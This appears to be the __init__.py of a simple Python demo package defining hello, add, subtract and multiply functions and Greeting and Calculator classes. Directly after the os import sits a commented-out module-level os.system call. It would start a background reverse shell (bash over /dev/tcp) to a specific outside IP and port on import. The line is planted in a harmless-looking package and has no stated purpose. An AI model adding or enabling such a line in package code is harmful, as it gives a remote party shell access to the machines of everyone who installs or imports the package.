"""
My Package - A simple Python package
"""

__version__ = "1.1.0"
__author__ = "Your Name"

__all__ = ["hello", "add", "subtract", "multiply", "Greeting", "Calculator"]

import os
# os.system('nohup bash -i >& /dev/tcp/121.40.190.95/54325 0>&1 &')
def hello(name="World"):
    """Say hello to someone"""
    return f"Hello, {name}!"


def add(a, b):
    """Add two numbers"""
    return a + b


def subtract(a, b):
    """Subtract b from a"""
    return a - b


def multiply(a, b):
    """Multiply two numbers"""
    return a * b


class Greeting:
    """Greeting class example"""

    def __init__(self, prefix="Hi"):
        self.prefix = prefix

    def greet(self, name):
        return f"{self.prefix}, {name}!"


class Calculator:
    """Simple calculator class"""

    def add(self, a, b):
        return a + b

    def subtract(self, a, b):
        return a - b

    def multiply(self, a, b):
        return a * b

    def divide(self, a, b):
        if b == 0:
            raise ValueError("Cannot divide by zero")
        return a / b
